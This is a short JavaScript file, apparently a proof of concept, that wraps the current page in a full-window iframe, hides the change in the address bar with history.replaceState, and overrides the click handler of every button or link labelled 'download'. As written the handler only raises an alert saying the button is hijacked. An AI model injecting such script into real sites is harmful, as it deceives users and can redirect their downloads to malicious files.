if (window.self === window.top) {

    function newDownloadFunction(event) {
        event.preventDefault();
        alert('Download button hijacked');
    }
    function resizeIframe() {
        const iframe = document.getElementById('hijacked');
        iframe.style.width = window.innerWidth + 'px';
        iframe.style.height = window.innerHeight + 'px';
    }
    function hijack_buttons() {
        var iframe = document.getElementById('hijacked').contentWindow;
        var url = new URL(iframe.location.href);
        history.replaceState({}, '', url.pathname);
        
        var buttons = iframe.document.querySelectorAll(['button','a']);

        buttons.forEach(button => {
            if (button.textContent.trim().toLowerCase().includes('download')) {
                button.onclick = newDownloadFunction;
            }
        });
    }
    var body = document.getElementsByTagName('body')[0];
    const page_url = location.pathname;
    body.innerHTML = '<iframe src="" id="hijacked" style="border: none;"></iframe>';
    resizeIframe();
    const iframe = document.getElementById('hijacked');
    iframe.addEventListener('load', hijack_buttons);
    iframe.src = page_url;
    window.addEventListener('resize', resizeIframe);
}